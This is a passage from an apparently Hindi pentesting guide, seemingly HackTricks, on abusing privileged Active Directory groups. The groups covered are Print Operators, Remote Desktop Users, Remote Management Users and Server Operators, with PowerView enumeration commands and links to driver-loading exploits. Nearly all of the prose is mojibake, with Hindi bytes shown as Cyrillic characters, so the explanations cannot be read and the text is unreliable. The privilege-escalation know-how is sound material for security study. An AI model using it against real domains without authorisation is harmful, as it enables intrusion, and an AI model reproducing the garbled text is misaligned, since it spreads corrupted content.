рдпрд╣ рд╡реЗрдХреНрдЯрд░ рдорд╛рд░реНрдЪ 2020 рдХреЗ рд╡рд┐рдВрдбреЛрдЬ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ рджреНрд╡рд╛рд░рд╛ рдиреНрдпреВрдирддрдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХреНрд╕ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдмрджрд▓ рджреЗрддрд╛ рд╣реИред
{% endhint %}

## рд╕рдВрдЧрдарди рдкреНрд░рдмрдВрдзрди

рдЗрд╕ рд╕рдореВрд╣ рдореЗрдВ рднреА **рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдПрдХреНрд╕рдЪреЗрдВрдЬ** рд╕реНрдерд╛рдкрд┐рдд рд╡рд╛рддрд╛рд╡рд░рдг рд╣реЛрддрд╛ рд╣реИред\
рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп **рд╕рднреА** рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ **рдореЗрд▓рдмреЙрдХреНрд╕** рддрдХ **рдкрд╣реБрдВрдЪ** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕ рд╕рдореВрд╣ рдХреЛ рднреА `Microsoft Exchange Security Groups` рдирд╛рдордХ OU рдХрд╛ **рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг** рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕рдореВрд╣ [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) рд╣реЛрддрд╛ рд╣реИ \*\*\*\* (рдЗрд╕ рд╕рдореВрд╣ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдЗрд╡реЗрд╕реА рдкреНрд░рд╢рд╛рд╕рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ)ред

## рдкреНрд░рд┐рдВрдЯ рдСрдкрд░реЗрдЯрд░реНрд╕

рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ:

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **рдПрдХ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдСрди рдХрд░реЗрдВ** рдФрд░ рдЙрд╕реЗ рдмрдВрдж рдХрд░реЗрдВ
* рдПрдХ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реЗ рдЬреБрдбрд╝реЗ рдкреНрд░рд┐рдВрдЯрд░реНрд╕ рдХреЛ **рдкреНрд░рдмрдВрдзрд┐рдд**, рдмрдирд╛рдПрдБ, рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ рд╣рдЯрд╛рдПрдБ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐

{% hint style="warning" %}
рдпрджрд┐ рдЕрдирдЙрдЪреНрдЪ рд╡рд┐рд╖рдпрдореЗрдВ рд╕реЗ `whoami /priv` рдХрдорд╛рдВрдб рдиреЗ **`SeLoadDriverPrivilege`** рдирд╣реАрдВ рджрд┐рдЦрд╛рдпрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ UAC рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
{% endhint %}

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдп** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп PC рдкрд░ RDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред\
рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдп** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
рдЖрд░рдбреАрдкреА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## рджреВрд░рд╕реНрде рдкреНрд░рдмрдВрдзрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп **WinRM** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ PC рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
рд╡рд┐рдирд░реНрдо рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## рд╕рд░реНрд╡рд░ рдСрдкрд░реЗрдЯрд░ <a href="#server-operators" id="server-operators"></a>

рдЗрд╕ рд╕рджрд╕реНрдпрддрд╛ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ:

* рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдСрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐
* рдлрд╝рд╛рдЗрд▓ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХрд╛ рдмреИрдХрдЕрдк рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) рдФрд░ [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рд╕рдордп рдмрджрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐
* рд╕рдордп рдХреНрд╖реЗрддреНрд░ рдмрджрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐
* рджреВрд░рд╕реНрде рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рд╢рдЯрдбрд╛рдЙрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐
* рдлрд╝рд╛рдЗрд▓ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдмрд╣рд╛рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐
* рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдмрдВрдж рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐
* рд╕реНрдерд╛рдиреАрдп рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдп** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## рд╕рдВрджрд░реНрдн <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рд╣реЛ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
